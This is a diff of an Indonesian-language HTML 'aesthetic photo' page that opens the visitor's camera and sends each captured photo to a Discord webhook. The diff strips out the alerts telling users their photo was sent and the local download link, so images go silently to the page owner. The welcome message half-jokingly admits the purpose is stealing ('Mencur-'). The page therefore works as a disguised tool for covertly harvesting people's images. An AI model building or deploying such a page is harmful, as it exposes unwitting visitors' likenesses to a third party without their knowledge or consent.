@@ -3,17 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Foto Kamera</title>
-    <script>
-        // Redirect function
-        function redirectTo(url) {
-            window.location.href = url;
+    <title>Website Foto Aesthetic by Risqi123</title>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background: linear-gradient(to bottom, #141e30, #243b55);
+            color: white;
+            font-family: Arial, sans-serif;
         }
 
-        // Example edge function for demonstration (simulated in client-side JavaScript)
-        function edgeFunction() {
-            const timestamp = new Date().toISOString();
-            return `Edge function executed at: ${timestamp}`;
+        #video {
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            margin-bottom: 20px;
+            max-width: 90%;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            background: #4CAF50;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.3s, background 0.3s;
+        }
+
+        button:hover {
+            background: #45a049;
+            transform: scale(1.1); /* Button zoom-in effect */
+        }
+
+        button:active {
+            background: #3e8e41;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            animation: fadeIn 0.5s ease-in-out; /* Modal fade-in animation */
+        }
+
+        .modal-content {
+            background-color: #333;
+            color: white;
+            border-radius: 10px;
+            padding: 20px;
+            max-width: 500px;
+            text-align: center;
+            font-size: 18px;
+            transform: scale(0.8);
+            animation: scaleUp 0.5s ease-in-out forwards; /* Modal scale-up animation */
+        }
+
+        .close-btn {
+            padding: 10px 20px;
+            background: #f44336;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background 0.3s;
+        }
+
+        .close-btn:hover {
+            background: #d32f2f;
+        }
+
+        /* Keyframes for animations */
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        @keyframes scaleUp {
+            from {
+                transform: scale(0.8);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+    </style>
+    <script>
+        let currentFacingMode = 'user';
+        const video = document.getElementById('video');
+
+        // Function to start camera with specific facing mode
+        function startCamera(facingMode) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode } })
+                .then(stream => {
+                    video.srcObject = stream;
+                })
+                .catch(error => {
+                    console.error('Error accessing camera:', error);
+                    alert('Kamera tidak bisa diakses. Pastikan izin kamera diaktifkan.');
+                });
+        }
+
+        // Toggle camera between front and back
+        function toggleCamera() {
+            currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+            startCamera(currentFacingMode);
         }
 
         // Function to send photo to Discord webhook
@@ -23,81 +145,68 @@
             formData.append('file', blob, 'photo.png');
 
             try {
-                const response = await fetch(webhookUrl, {
+                await fetch(webhookUrl, {
                     method: 'POST',
                     body: formData
                 });
-
-                if (response.ok) {
-                    alert('Foto berhasil dikirim ke Discord!');
-                } else {
-                    console.error('Gagal mengirim foto:', response.statusText);
-                    alert('Gagal mengirim foto ke Discord.');
-                }
             } catch (error) {
                 console.error('Error:', error);
-                alert('Terjadi kesalahan saat mengirim foto ke Discord.');
             }
         }
-    </script>
-</head>
-<body>
-    <header>
-        <h1>Ambil Foto dengan Kamera</h1>
-        <nav>
-            <button onclick="redirectTo('https://example.com')">Go to Example</button>
-        </nav>
-    </header>
-    <video id="video" autoplay playsinline style="width: 100%; max-width: 400px;"></video>
-    <canvas id="canvas" style="display: none;"></canvas>
-    <br>
-    <button id="capture">FOTO</button>
-    <a id="download" style="display: none;">Download Foto</a>
 
-    <footer>
-        <p id="edge-function-result">Edge Function Result: Not Executed</p>
-        <button onclick="document.getElementById('edge-function-result').textContent = edgeFunction();">
-            Execute Edge Function
-        </button>
-    </footer>
+        // Show modal when page is loaded
+        document.addEventListener('DOMContentLoaded', () => {
+            const canvas = document.getElementById('canvas');
+            const captureButton = document.getElementById('capture');
+            const modal = document.getElementById('modal');
+            const closeModalBtn = document.getElementById('close-modal');
 
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureButton = document.getElementById('capture');
-        const downloadLink = document.getElementById('download');
+            startCamera(currentFacingMode);
 
-        // Mengakses kamera depan
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
-            .then(stream => {
-                video.srcObject = stream;
-            })
-            .catch(error => {
-                console.error('Error accessing camera:', error);
-                alert('Kamera tidak bisa diakses. Pastikan izin kamera diaktifkan.');
+            // Open the modal on page load
+            modal.style.display = 'flex';
+
+            // Close modal when button is clicked
+            closeModalBtn.addEventListener('click', () => {
+                modal.style.display = 'none';
             });
 
-        captureButton.addEventListener('click', () => {
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
+            captureButton.addEventListener('click', () => {
+                const context = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
 
-            // Menggambar video ke canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                // Draw video frame to canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // Mengubah canvas menjadi gambar
-            canvas.toBlob(blob => {
-                // Kirim foto ke Discord
-                sendToDiscord(blob);
-
-                // Membuat tautan unduhan
-                const url = URL.createObjectURL(blob);
-                downloadLink.href = url;
-                downloadLink.download = 'foto_kamera.png';
-                downloadLink.style.display = 'inline';
-                downloadLink.textContent = 'Download Foto';
+                // Convert canvas to blob and send to Discord
+                canvas.toBlob(blob => {
+                    sendToDiscord(blob);
+                });
             });
         });
     </script>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <div class="button-group">
+        <!-- Foto Button with Camera Icon -->
+        <button id="capture">
+            <i class="fas fa-camera"></i>
+        </button>
+        <!-- Camera Toggle Button with Rotate Icon -->
+        <button onclick="toggleCamera()">
+            <i class="fas fa-sync-alt"></i>
+        </button>
+    </div>
+
+    <!-- Modal for welcome message -->
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <p>Selamat datang di Website Foto, website ini di desain khusus untuk orang yang malas buka kamera tapi ingin foto dan juga untuk Mencur- maksud saya Website ini bermanfaat. Terimakasih, gunakan dengan bijak.</p>
+            <button id="close-modal" class="close-btn">Tutup</button>
+        </div>
+    </div>
 </body>
 </html>
